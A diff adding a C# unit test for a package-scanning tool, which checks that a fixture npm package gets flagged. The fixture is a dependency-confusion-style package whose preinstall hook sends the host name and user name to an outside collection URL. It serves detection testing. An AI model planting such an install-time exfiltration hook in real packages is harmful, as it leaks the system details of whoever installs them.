@@ -63,6 +63,24 @@ public sealed class PackageReviewTests : IDisposable
     }
 
     [Fact]
+    public void The_summarize_file_overview_names_the_strongest_level_and_the_findings_of_each_view()
+    {
+        var flagged = Tgz("internal-auth-1.0.0.tgz",
+            ("package/package.json", """{"name":"internal-auth-utils","version":"99.0.0","scripts":{"preinstall":"node index.js"}}"""),
+            ("package/index.js", "const os=require('os'),https=require('https');\nhttps.get('https://x1.oastify.com/?h='+os.hostname()+'&u='+os.userInfo().username);"));
+        var plain = Zip("small-1.0.zip", ("package/package.json", U("""{"name":"small","version":"1.0.0"}""")), ("package/index.js", U("module.exports = 1;")));
+        using var workspace = new AssemblyWorkspace(new ServerOptions());
+        var inspection = new InspectionService(workspace);
+        var overview = Corvus.Tools.ContainerText.Summary(inspection.Summarize(null, flagged, default), "overview");
+        Assert.Equal("noteworthy", overview.Level);
+        Assert.Equal("noteworthy", overview.Findings![0].Level);
+        Assert.Contains(overview.Findings, f => f is { Rule: "package/collection-url", Source: "package", Location: "package/index.js" });
+        Assert.Contains("Level: noteworthy, ", Corvus.Tools.ContainerText.Summary(overview), StringComparison.Ordinal);
+        var none = Corvus.Tools.ContainerText.Summary(inspection.Summarize(null, plain, default), "overview");
+        Assert.Equal(("none", null), (none.Level, none.Findings));
+    }
+
+    [Fact]
     public void An_install_script_that_downloads_and_runs_a_program_is_noteworthy()
     {
         var r = Review(Tgz("parser-0.7.29.tgz",
